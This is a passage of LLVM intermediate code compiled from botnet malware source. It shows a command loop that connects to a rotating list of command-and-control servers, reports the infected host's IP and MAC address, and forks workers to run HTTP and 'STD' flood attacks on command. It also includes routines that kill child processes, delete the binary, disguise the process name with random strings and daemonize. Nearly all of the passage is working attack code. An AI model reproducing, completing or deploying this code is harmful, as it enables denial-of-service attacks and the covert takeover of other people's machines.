  %201 = load i8*, i8** %184, align 8
  %202 = tail call i32 @atoi(i8* %201) #14
  %203 = getelementptr inbounds i8*, i8** %1, i64 6
  %204 = load i8*, i8** %203, align 8
  %205 = tail call i32 @atoi(i8* %204) #14
  tail call void @SendHTTP(i8* %193, i8* %195, i16 zeroext %198, i8* %200, i32 %202, i32 %205)
  tail call void @exit(i32 0) #16
  unreachable

; <label>:206:                                    ; preds = %.loopexit134
  %207 = tail call i32 @strcmp(i8* %173, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i64 0, i64 0)) #14
  %208 = icmp eq i32 %207, 0
  br i1 %208, label %209, label %.loopexit132

; <label>:209:                                    ; preds = %206
  %210 = icmp slt i32 %0, 4
  br i1 %210, label %.loopexit, label %211

; <label>:211:                                    ; preds = %209
  %212 = getelementptr inbounds i8*, i8** %1, i64 2
  %213 = load i8*, i8** %212, align 8
  %214 = tail call i32 @atoi(i8* %213) #14
  %215 = icmp slt i32 %214, 1
  br i1 %215, label %.loopexit, label %216

; <label>:216:                                    ; preds = %211
  %217 = getelementptr inbounds i8*, i8** %1, i64 3
  %218 = load i8*, i8** %217, align 8
  %219 = tail call i32 @atoi(i8* %218) #14
  %220 = icmp slt i32 %219, 1
  br i1 %220, label %.loopexit, label %221

; <label>:221:                                    ; preds = %216
  %222 = getelementptr inbounds i8*, i8** %1, i64 1
  %223 = load i8*, i8** %222, align 8
  %strchr121 = tail call i8* @strchr(i8* %223, i32 44)
  %224 = icmp eq i8* %strchr121, null
  br i1 %224, label %231, label %.preheader131.preheader

.preheader131.preheader:                          ; preds = %221
  br label %.preheader131

.preheader131:                                    ; preds = %.preheader131.preheader, %227
  %.sink126 = phi i8* [ null, %227 ], [ %223, %.preheader131.preheader ]
  %225 = tail call i8* @strtok(i8* %.sink126, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.117, i64 0, i64 0)) #6
  %226 = icmp eq i8* %225, null
  br i1 %226, label %.loopexit132.loopexit, label %227

; <label>:227:                                    ; preds = %.preheader131
  %228 = tail call i32 @listFork()
  %229 = icmp eq i32 %228, 0
  br i1 %229, label %230, label %.preheader131

; <label>:230:                                    ; preds = %227
  tail call void @sendSTD(i8* nonnull %225, i32 %214, i32 %219)
  unreachable

; <label>:231:                                    ; preds = %221
  %232 = tail call i32 @listFork()
  %233 = icmp eq i32 %232, 0
  br i1 %233, label %234, label %.loopexit

; <label>:234:                                    ; preds = %231
  tail call void @sendSTD(i8* %223, i32 %214, i32 %219)
  unreachable

.loopexit132.loopexit:                            ; preds = %.preheader131
  br label %.loopexit132

.loopexit132:                                     ; preds = %.loopexit132.loopexit, %206
  %235 = load i8*, i8** %1, align 8
  %236 = tail call i32 @strcmp(i8* %235, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.132, i64 0, i64 0)) #14
  %237 = icmp eq i32 %236, 0
  %238 = load i64, i64* @numpids, align 8
  %239 = icmp ne i64 %238, 0
  %or.cond = and i1 %237, %239
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit132
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %252
  %.0139 = phi i64 [ %253, %252 ], [ 0, %.lr.ph.preheader ]
  %240 = load i32*, i32** @pids, align 8
  %241 = getelementptr inbounds i32, i32* %240, i64 %.0139
  %242 = load i32, i32* %241, align 4
  %243 = icmp eq i32 %242, 0
  br i1 %243, label %252, label %244

; <label>:244:                                    ; preds = %.lr.ph
  %245 = tail call i32 @getpid() #6
  %246 = icmp eq i32 %242, %245
  br i1 %246, label %252, label %247

; <label>:247:                                    ; preds = %244
  %248 = load i32*, i32** @pids, align 8
  %249 = getelementptr inbounds i32, i32* %248, i64 %.0139
  %250 = load i32, i32* %249, align 4
  %251 = tail call i32 @kill(i32 %250, i32 9) #6
  br label %252

; <label>:252:                                    ; preds = %244, %.lr.ph, %247
  %253 = add i64 %.0139, 1
  %254 = load i64, i64* @numpids, align 8
  %255 = icmp ult i64 %253, %254
  br i1 %255, label %.lr.ph, label %.loopexit.loopexit153

.loopexit.loopexit:                               ; preds = %.preheader
  br label %.loopexit

.loopexit.loopexit153:                            ; preds = %252
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit153, %.loopexit.loopexit, %.loopexit132, %231, %188, %100, %20, %209, %211, %216, %176, %178, %183, %107, %109, %114, %119, %127, %134, %32, %34, %39, %44, %49, %59, %11, %26
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #6
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.133, i64 0, i64 0)) #6
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #15
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #6
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #6
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.134, i64 0, i64 0), i32 0) #6
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.135, i64 0, i64 0)) #14
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #6
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #6
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #6
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #6
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #2

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @getEndianness() local_unnamed_addr #0 {
  ret i32 ptrtoint ([14 x i8]* @.str.137 to i32)
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @switchCommStock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #6
  store i32 0, i32* @switchCommStock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @botnetServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %9, 50
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @botnetServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [100 x i32], [100 x i32]* @ServerInfo, i64 0, i64 %11
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = inttoptr i64 %14 to i8*
  %16 = call i8* @strcpy(i8* nonnull %2, i8* %15) #6
  %17 = load i32, i32* @botnetServer, align 4
  %18 = call i8* @strchr(i8* nonnull %2, i32 58) #14
  %19 = icmp eq i8* %18, null
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %7
  %21 = getelementptr inbounds i8, i8* %18, i64 1
  %22 = call i32 @atoi(i8* %21) #14
  store i8 0, i8* %18, align 1
  br label %23

; <label>:23:                                     ; preds = %7, %20
  %.0 = phi i32 [ %22, %20 ], [ %17, %7 ]
  %24 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %24, i32* @switchCommStock, align 4
  %25 = call i32 @connectTimeout(i32 %24, i8* nonnull %2, i32 %.0, i32 30)
  %26 = icmp eq i32 %25, 0
  %. = zext i1 %26 to i32
  ret i32 %.
}

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #8

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readonly) local_unnamed_addr #11 {
  %3 = alloca [32 x i8], align 16
  %4 = alloca i32, align 4
  %5 = alloca [4096 x i8], align 16
  %6 = alloca [10 x i8*], align 16
  %7 = load i8*, i8** %1, align 8
  %8 = tail call i32 @unlink(i8* %7) #6
  tail call void @rand_init()
  %9 = tail call i32 @rand_next()
  %10 = shl i32 %9, 2
  %11 = and i32 %10, 12
  %12 = add nuw nsw i32 %11, 12
  %13 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 0
  call void @rand_alphastr(i8* nonnull %13, i32 %12)
  %14 = zext i32 %12 to i64
  %15 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 %14
  store i8 0, i8* %15, align 4
  %16 = load i8*, i8** %1, align 8
  %17 = call i32 @util_strcpy(i8* %16, i8* nonnull %13)
  %18 = tail call i32 @rand_next()
  %19 = urem i32 %18, 6
  %20 = shl nuw nsw i32 %19, 2
  %21 = add nuw nsw i32 %20, 12
  call void @rand_alphastr(i8* nonnull %13, i32 %21)
  %22 = zext i32 %21 to i64
  %23 = getelementptr inbounds [32 x i8], [32 x i8]* %3, i64 0, i64 %22
  store i8 0, i8* %23, align 4
  %24 = call i32 (i32, ...) @prctl(i32 15, i8* nonnull %13) #6
  %25 = call i64 @time(i64* null) #6
  %26 = call i32 @getpid() #6
  %27 = zext i32 %26 to i64
  %28 = xor i64 %27, %25
  %29 = trunc i64 %28 to i32
  call void @srand(i32 %29) #6
  call void @rand_init()
  %30 = call i32 @getOurIP()
  %31 = call i32 @fork() #6
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %35, label %33

; <label>:33:                                     ; preds = %2
  %34 = call i32 @waitpid(i32 %31, i32* nonnull %4, i32 0) #6
  call void @exit(i32 0) #16
  unreachable

; <label>:35:                                     ; preds = %2
  %36 = call i32 @fork() #6
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %39, label %38

; <label>:38:                                     ; preds = %35
  call void @exit(i32 0) #16
  unreachable

; <label>:39:                                     ; preds = %35
  %40 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.141, i64 0, i64 0)) #6
  %41 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #6
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 0
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 1
  %44 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 0
  br label %.backedge78

.backedge78.loopexit:                             ; preds = %.backedge
  br label %.backedge78.backedge

.backedge78:                                      ; preds = %.backedge78.backedge, %39
  %45 = call i32 @initConnection()
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %47, label %.backedge78.backedge

; <label>:47:                                     ; preds = %.backedge78
  %48 = load i32, i32* @switchCommStock, align 4
  %49 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %50 = call i8* @inet_ntoa(i32 %49) #6
  %51 = call i8* @getBuildz()
  %52 = call i32 (i32, i8*, ...) @botnetPrint(i32 %48, i8* getelementptr inbounds ([130 x i8], [130 x i8]* @.str.142, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8* %50, i32 ptrtoint ([14 x i8]* @.str.137 to i32), i8* %51)
  call void @CleanDevice()
  call void @UpdateNameSrvs()
  %53 = load i32, i32* @switchCommStock, align 4
  %54 = call i32 @recvLine(i32 %53, i8* nonnull %42, i32 4096)
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %.backedge78.backedge, label %.preheader76.preheader

.backedge78.backedge:                             ; preds = %47, %.backedge78, %.backedge78.loopexit
  br label %.backedge78

.preheader76.preheader:                           ; preds = %47
  br label %.preheader76

.preheader76:                                     ; preds = %.preheader76.preheader, %.backedge
  %56 = phi i32 [ %155, %.backedge ], [ %54, %.preheader76.preheader ]
  %57 = load i64, i64* @numpids, align 8
  %58 = icmp eq i64 %57, 0
  br i1 %58, label %._crit_edge92, label %.lr.ph91.preheader

.lr.ph91.preheader:                               ; preds = %.preheader76
  br label %.lr.ph91

.lr.ph91:                                         ; preds = %.lr.ph91.preheader, %101
  %indvars.iv = phi i64 [ %indvars.iv.next, %101 ], [ 0, %.lr.ph91.preheader ]
  %59 = load i32*, i32** @pids, align 8
  %60 = getelementptr inbounds i32, i32* %59, i64 %indvars.iv
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @waitpid(i32 %61, i32* null, i32 1) #6
  %63 = icmp sgt i32 %62, 0
  br i1 %63, label %.preheader, label %101

.preheader:                                       ; preds = %.lr.ph91
  %64 = add nuw i64 %indvars.iv, 1
  %65 = load i64, i64* @numpids, align 8
  %66 = icmp ult i64 %64, %65
  %67 = load i32*, i32** @pids, align 8
  %68 = trunc i64 %indvars.iv to i32
  br i1 %66, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %69 = trunc i64 %64 to i32
  %70 = trunc i64 %indvars.iv to i32
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %71 = phi i32* [ %80, %.lr.ph ], [ %67, %.lr.ph.preheader ]
  %72 = phi i64 [ %77, %.lr.ph ], [ %64, %.lr.ph.preheader ]
  %.06783 = phi i32 [ %.067, %.lr.ph ], [ %69, %.lr.ph.preheader ]
  %.067.in82 = phi i32 [ %.06783, %.lr.ph ], [ %70, %.lr.ph.preheader ]
  %73 = getelementptr inbounds i32, i32* %71, i64 %72
  %74 = load i32, i32* %73, align 4
  %75 = zext i32 %.067.in82 to i64
  %76 = getelementptr inbounds i32, i32* %71, i64 %75
  store i32 %74, i32* %76, align 4
  %.067 = add i32 %.06783, 1
  %77 = zext i32 %.067 to i64
  %78 = load i64, i64* @numpids, align 8
  %79 = icmp ult i64 %77, %78
  %80 = load i32*, i32** @pids, align 8
  br i1 %79, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.067.in.lcssa = phi i32 [ %68, %.preheader ], [ %.06783, %._crit_edge.loopexit ]
  %.lcssa = phi i32* [ %67, %.preheader ], [ %80, %._crit_edge.loopexit ]
  %81 = zext i32 %.067.in.lcssa to i64
  %82 = getelementptr inbounds i32, i32* %.lcssa, i64 %81
  store i32 0, i32* %82, align 4
  %83 = load i64, i64* @numpids, align 8
  %84 = add i64 %83, -1
  store i64 %84, i64* @numpids, align 8
  %85 = shl i64 %83, 2
  %86 = call noalias i8* @malloc(i64 %85) #6
  %87 = bitcast i8* %86 to i32*
  %88 = icmp eq i64 %84, 0
  %89 = load i32*, i32** @pids, align 8
  br i1 %88, label %._crit_edge88, label %.lr.ph87.preheader

.lr.ph87.preheader:                               ; preds = %._crit_edge
  br label %.lr.ph87

.lr.ph87:                                         ; preds = %.lr.ph87.preheader, %.lr.ph87
  %90 = phi i32* [ %99, %.lr.ph87 ], [ %89, %.lr.ph87.preheader ]
  %91 = phi i64 [ %96, %.lr.ph87 ], [ 0, %.lr.ph87.preheader ]
  %.16885 = phi i32 [ %95, %.lr.ph87 ], [ 0, %.lr.ph87.preheader ]
  %92 = getelementptr inbounds i32, i32* %90, i64 %91
  %93 = load i32, i32* %92, align 4
  %94 = getelementptr inbounds i32, i32* %87, i64 %91
  store i32 %93, i32* %94, align 4
  %95 = add i32 %.16885, 1
  %96 = zext i32 %95 to i64
  %97 = load i64, i64* @numpids, align 8
  %98 = icmp ult i64 %96, %97
  %99 = load i32*, i32** @pids, align 8
  br i1 %98, label %.lr.ph87, label %._crit_edge88.loopexit

._crit_edge88.loopexit:                           ; preds = %.lr.ph87
  br label %._crit_edge88

._crit_edge88:                                    ; preds = %._crit_edge88.loopexit, %._crit_edge
  %.lcssa79 = phi i32* [ %89, %._crit_edge ], [ %99, %._crit_edge88.loopexit ]
  %100 = bitcast i32* %.lcssa79 to i8*
  call void @free(i8* %100) #6
  store i8* %86, i8** bitcast (i32** @pids to i8**), align 8
  br label %101

; <label>:101:                                    ; preds = %.lr.ph91, %._crit_edge88
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %sext = shl i64 %indvars.iv.next, 32
  %102 = ashr exact i64 %sext, 32
  %103 = load i64, i64* @numpids, align 8
  %104 = icmp ult i64 %102, %103
  br i1 %104, label %.lr.ph91, label %._crit_edge92.loopexit

._crit_edge92.loopexit:                           ; preds = %101
  br label %._crit_edge92

._crit_edge92:                                    ; preds = %._crit_edge92.loopexit, %.preheader76
  %105 = sext i32 %56 to i64
  %106 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 %105
  store i8 0, i8* %106, align 1
  call void @trim(i8* nonnull %42)
  %107 = load i8, i8* %42, align 16
  %108 = icmp eq i8 %107, 33
  br i1 %108, label %.preheader105.preheader, label %.backedge

.preheader105.preheader:                          ; preds = %._crit_edge92
  br label %.preheader105

.preheader105:                                    ; preds = %.preheader105.preheader, %110
  %.065 = phi i8* [ %111, %110 ], [ %43, %.preheader105.preheader ]
  %109 = load i8, i8* %.065, align 1
  switch i8 %109, label %110 [
    i8 0, label %.backedge.loopexit121
    i8 32, label %112
  ]

; <label>:110:                                    ; preds = %.preheader105
  %111 = getelementptr inbounds i8, i8* %.065, i64 1
  br label %.preheader105

; <label>:112:                                    ; preds = %.preheader105
  store i8 0, i8* %.065, align 1
  %113 = call i64 @strlen(i8* %43) #14
  %114 = getelementptr inbounds [4096 x i8], [4096 x i8]* %5, i64 0, i64 %113
  %115 = getelementptr inbounds i8, i8* %114, i64 2
  br label %116

; <label>:116:                                    ; preds = %121, %112
  %117 = call i64 @strlen(i8* %115) #14
  %118 = add i64 %117, -1
  %119 = getelementptr inbounds i8, i8* %115, i64 %118
  %120 = load i8, i8* %119, align 1
  switch i8 %120, label %.preheader74.preheader [
    i8 13, label %121
    i8 10, label %121
  ]

.preheader74.preheader:                           ; preds = %116
  br label %.preheader74

; <label>:121:                                    ; preds = %116, %116
  store i8 0, i8* %119, align 1
  br label %116

.preheader74:                                     ; preds = %.preheader74.preheader, %123
  %.066 = phi i8* [ %124, %123 ], [ %115, %.preheader74.preheader ]
  %122 = load i8, i8* %.066, align 1
  switch i8 %122, label %123 [
    i8 32, label %125
    i8 0, label %125
  ]

; <label>:123:                                    ; preds = %.preheader74
  %124 = getelementptr inbounds i8, i8* %.066, i64 1
  br label %.preheader74

; <label>:125:                                    ; preds = %.preheader74, %.preheader74
  store i8 0, i8* %.066, align 1
  %126 = getelementptr inbounds i8, i8* %.066, i64 1
  %127 = load i8, i8* %115, align 1
  %128 = icmp eq i8 %127, 0
  br i1 %128, label %._crit_edge96, label %.lr.ph95.preheader

.lr.ph95.preheader:                               ; preds = %125
  br label %.lr.ph95

.lr.ph95:                                         ; preds = %.lr.ph95.preheader, %.lr.ph95
  %129 = phi i8 [ %134, %.lr.ph95 ], [ %127, %.lr.ph95.preheader ]
  %.06493 = phi i8* [ %133, %.lr.ph95 ], [ %115, %.lr.ph95.preheader ]
  %130 = zext i8 %129 to i32
  %131 = call i32 @toupper(i32 %130) #14
  %132 = trunc i32 %131 to i8
  store i8 %132, i8* %.06493, align 1
  %133 = getelementptr inbounds i8, i8* %.06493, i64 1
  %134 = load i8, i8* %133, align 1
  %135 = icmp eq i8 %134, 0
  br i1 %135, label %._crit_edge96.loopexit, label %.lr.ph95

._crit_edge96.loopexit:                           ; preds = %.lr.ph95
  br label %._crit_edge96

._crit_edge96:                                    ; preds = %._crit_edge96.loopexit, %125
  %136 = call i8* @strtok(i8* %126, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i64 0, i64 0)) #6
  store i8* %115, i8** %44, align 16
  %137 = icmp eq i8* %136, null
  br i1 %137, label %._crit_edge101.thread, label %.lr.ph100.preheader

.lr.ph100.preheader:                              ; preds = %._crit_edge96
  br label %.lr.ph100

._crit_edge101.thread:                            ; preds = %._crit_edge96
  call void @processCmd(i32 1, i8** nonnull %44)
  br label %.backedge

.lr.ph100:                                        ; preds = %.lr.ph100.preheader, %150
  %.06298 = phi i8* [ %151, %150 ], [ %136, %.lr.ph100.preheader ]
  %.06397 = phi i32 [ %.1, %150 ], [ 1, %.lr.ph100.preheader ]
  %138 = load i8, i8* %.06298, align 1
  %139 = icmp eq i8 %138, 10
  br i1 %139, label %150, label %140

; <label>:140:                                    ; preds = %.lr.ph100
  %141 = call i64 @strlen(i8* nonnull %.06298) #14
  %142 = add i64 %141, 1
  %143 = call noalias i8* @malloc(i64 %142) #6
  %144 = sext i32 %.06397 to i64
  %145 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %144
  store i8* %143, i8** %145, align 8
  %146 = call i64 @strlen(i8* nonnull %.06298) #14
  %147 = add i64 %146, 1
  call void @llvm.memset.p0i8.i64(i8* %143, i8 0, i64 %147, i32 1, i1 false)
  %148 = call i8* @strcpy(i8* %143, i8* nonnull %.06298) #6
  %149 = add nsw i32 %.06397, 1
  br label %150

; <label>:150:                                    ; preds = %.lr.ph100, %140
  %.1 = phi i32 [ %149, %140 ], [ %.06397, %.lr.ph100 ]
  %151 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i64 0, i64 0)) #6
  %152 = icmp eq i8* %151, null
  br i1 %152, label %._crit_edge101, label %.lr.ph100

._crit_edge101:                                   ; preds = %150
  call void @processCmd(i32 %.1, i8** nonnull %44)
  %153 = icmp sgt i32 %.1, 1
  br i1 %153, label %.lr.ph104.preheader, label %.backedge

.lr.ph104.preheader:                              ; preds = %._crit_edge101
  %wide.trip.count = zext i32 %.1 to i64
  br label %.lr.ph104

.backedge.loopexit:                               ; preds = %.lr.ph104
  br label %.backedge

.backedge.loopexit121:                            ; preds = %.preheader105
  br label %.backedge

.backedge:                                        ; preds = %.backedge.loopexit121, %.backedge.loopexit, %._crit_edge101.thread, %._crit_edge101, %._crit_edge92
  %154 = load i32, i32* @switchCommStock, align 4
  %155 = call i32 @recvLine(i32 %154, i8* nonnull %42, i32 4096)
  %156 = icmp eq i32 %155, -1
  br i1 %156, label %.backedge78.loopexit, label %.preheader76

.lr.ph104:                                        ; preds = %.lr.ph104.preheader, %.lr.ph104
  %indvars.iv111 = phi i64 [ %indvars.iv.next112, %.lr.ph104 ], [ 1, %.lr.ph104.preheader ]
  %157 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 %indvars.iv111
  %158 = load i8*, i8** %157, align 8
  call void @free(i8* %158) #6
  %indvars.iv.next112 = add nuw nsw i64 %indvars.iv111, 1
  %exitcond = icmp eq i64 %indvars.iv.next112, %wide.trip.count
  br i1 %exitcond, label %.backedge.loopexit, label %.lr.ph104
}

; Function Attrs: nounwind
declare i32 @unlink(i8* nocapture readonly) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) local_unnamed_addr #2

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @chdir(i8*) local_unnamed_addr #2

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #8

attributes #0 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
